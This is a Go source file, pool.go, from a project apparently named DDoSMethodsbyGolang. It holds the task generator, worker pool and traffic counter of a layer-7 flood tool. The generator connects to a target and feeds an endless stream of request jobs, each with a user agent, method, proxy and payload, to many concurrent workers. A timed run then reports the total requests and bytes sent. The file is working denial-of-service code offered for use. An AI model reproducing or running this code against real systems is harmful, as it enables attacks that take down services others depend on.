/*
 * @Author: uyplayer
 * @Date: 2022/3/9 10:25 PM
 * @Email: uyplayer@qq.com
 * @File: pool.go
 * @Software: GoLand
 * @Dir: DDoSMethodsbyGolang / layer7
 * @Project_Name: DDoSMethodsbyGolang
 * @Description:
 */

package layer7

import (
	"DDoSbyGolang/common"
	"context"
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"
	"unsafe"
)

//
//  Generator
//  @Description: 安排活儿
//  @receiver Layer7
//
func (L Layer7) Generator() {
	common.Info.Println(" Generator 启动了 ")
	// 形成随机数
	rand.Seed(time.Now().UnixNano())
	// 连接tcp
	// 创建tcp连接
	pUrl, err := net.ResolveTCPAddr("tcp4", L.Target)
	//proUel, err := net.ResolveTCPAddr("tcp4", work.Proxy)
	if err != nil {
		common.Error.Println(" url.Parse : ", err)
	}
	// tcp连接
	fmt.Println(pUrl)
	con, err := net.DialTCP("tcp4", nil, pUrl)
	if err != nil {
		common.Error.Println(" net.DialTCP : ", err)
		os.Exit(1)
	} else {

		common.Info.Println(" TCP 连接成功 ", err)
	}

	// Generator
	go func(connect *net.TCPConn) {
		for {
			fmt.Println("  Generator 正在形成任务")
			select {
			case <-L.Context.Done():
				common.Info.Println(L.Context.Err())
				return
			default:

				common.Info.Println(" 正在发送任务 ")
				w := Work{
					Target:    L.Target,
					UserAgent: getUserAgent(),
					Context:   L.Context,
					Port:      L.Port,
					Url:       L.Url,
					Method:    L.Method,
					PanRec:    panicRecover,
					Con:       connect,
					Proxy:     L.Proxy,
					Payload:   L.Payload,
				}
				L.Data <- w
			}
		}

	}(con)

}

//
//  Generator
//  @Description: 干活儿的
//  @receiver Layer7
//
func (L Layer7) Workers() {

	common.Info.Println(" Workers 启动了 ")
	// 创建workers ，每一个worker 相当于一个go routine
	for i := 0; i < L.MaxWorkerNum; i++ {
		L.Wg.Add(1)
		go func(workerID int) {
			select {
			case <-L.Context.Done():
				common.Info.Println(L.Context.Err())
				return
			default:
				// 干完活就Done通知
				defer L.Wg.Done()
				defer common.Warning.Fatalln("worker ", workerID, " 准备休息了 ")
				common.Info.Println(" Workers 正在接受任务 ")
				for work := range L.Data {
					// 提交任务
					L.Func(work)

				}
			}

		}(i)

	}

}

//
//  Wait
//  @Description: 等待完成活儿
//
func (L Layer7) Wait(cancel context.CancelFunc) {

	common.Info.Println(" Wait 启动了 ")
	select {
	case <-L.Context.Done():
		common.Error.Println(L.Context.Err())

	default:
		// 统计
		RequestSent := 0
		BytesSize := uintptr(0)
		go func(r *int, b *uintptr) {
			for pl := range L.Payload {
				// 提交任务
				*r = *r + 1
				*b = *b + unsafe.Sizeof(pl)
			}
		}(&RequestSent, &BytesSize)
		time.Sleep(time.Second * time.Duration(L.RunTime))
		fmt.Println("******************************************************")
		fmt.Println(" 总请求次数 ： ", RequestSent)
		fmt.Println(" 总流量 ： ", BytesSize, "byt")
		fmt.Println("******************************************************")
		os.Exit(1)
		// 等待
		L.Wg.Wait()
		common.Info.Println(" Wait 结束")

	}

}

//
//  counter
//  @Description: 统计
//  @receiver L
//  @return int
//  @return uintptr
//
//
//  counter
//  @Description: 统计
//  @receiver L
//  @return int
//  @return uintptr
//
func (L Layer7) counter(RequestSent *int, BytesSize *uintptr) {

	// 计算payload和请求
	//var mu *sync.RWMutex
	go func(r *int, b *uintptr) {
		select {
		case <-L.Context.Done():
			common.Info.Println(L.Context.Err())
			return
		default:
			// 开始计算
			fmt.Println(" 正在计算Payload")
			//for pl := range L.Payload {
			//	// 计算
			//	*r = *r + 1
			//	*b = *b + unsafe.Sizeof(pl)
			//	fmt.Println(" 完成一个Payload计算")
			//
			//}
		}
	}(RequestSent, BytesSize)

}

//
//  panicRecover
//  @Description:
//
func panicRecover() {
	//捕获test抛出的panic
	if err := recover(); err != nil {
		common.Error.Println(" 发生致命错误 ： ", err)
	}
}
